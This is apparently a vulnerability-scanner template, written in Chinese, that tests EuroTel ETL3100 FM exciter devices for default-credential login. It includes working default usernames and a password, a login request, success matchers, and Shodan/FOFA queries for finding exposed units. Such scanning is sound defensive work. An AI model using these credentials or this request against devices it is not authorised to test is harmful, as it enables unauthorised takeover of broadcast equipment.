id: etl3100-default-login

info:
  name: EuroTel ETL3100 默认口令登录（弱口令）
  author: r3Y3r53
  severity: high
  description: |
    该模板用于检测 EuroTel ETL3100 是否仍可使用默认凭据或弱口令登录。模板主要向 `/index.php`、`/exciter.php` 等认证入口发送请求，使用内置默认凭据组合进行认证尝试，并根据响应中的 `status_code_2 == 200`、`contains_all(body_2, "FM Exciter", "Summary", "/logout.php")` 等登录成功特征判断登录是否成功；命中说明目标未及时修改出厂、示例或初始化账号口令。
  impact: |
    - 攻击者可接管 EuroTel ETL3100 的 Web 管理界面，查看设备状态、网络配置、运行日志或敏感业务参数。
    - 被接管的网络、工控、打印、语音、存储或远程管理设备可能被用于中断业务、改变路由/访问策略、窃取流量或作为内网横向移动入口。
  remediation: |
    - 立即修改所有默认账号口令，禁用不再使用的出厂账号，并为管理账户设置高强度唯一密码。
    - 将设备管理入口限制在 VPN、堡垒机或可信管理网段内，避免直接暴露到公网。
    - 升级设备固件或管理组件，审计近期登录记录、配置变更和异常会话。
  reference:
    - https://www.zeroscience.mk/en/vulnerabilities/ZSL-2023-5782.php
    - https://www.exploit-db.com/exploits/51684
  classification:
    cpe: cpe:2.3:h:eurotel:etl3100:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 2
    vendor: eurotel
    product: etl3100
    shodan-query: html:"ETL3100"
    fofa-query: body="ETL3100"
  tags: misconfig,default-login,eurotel,vuln

http:
  - raw:
      - |
        POST /index.php HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/x-www-form-urlencoded

        txtUserId={{username}}&txtPassword={{password}}&btnLogin=Login
      - |
        GET /exciter.php HTTP/1.1
        Host: {{Hostname}}

    attack: pitchfork
    payloads:
      username:
        - user
        - operator
      password:
        - etl3100rt1234
    matchers:
      - type: dsl
        dsl:
          - 'status_code_2 == 200'
          - 'contains_all(body_2, "FM Exciter", "Summary", "/logout.php")'
        condition: and
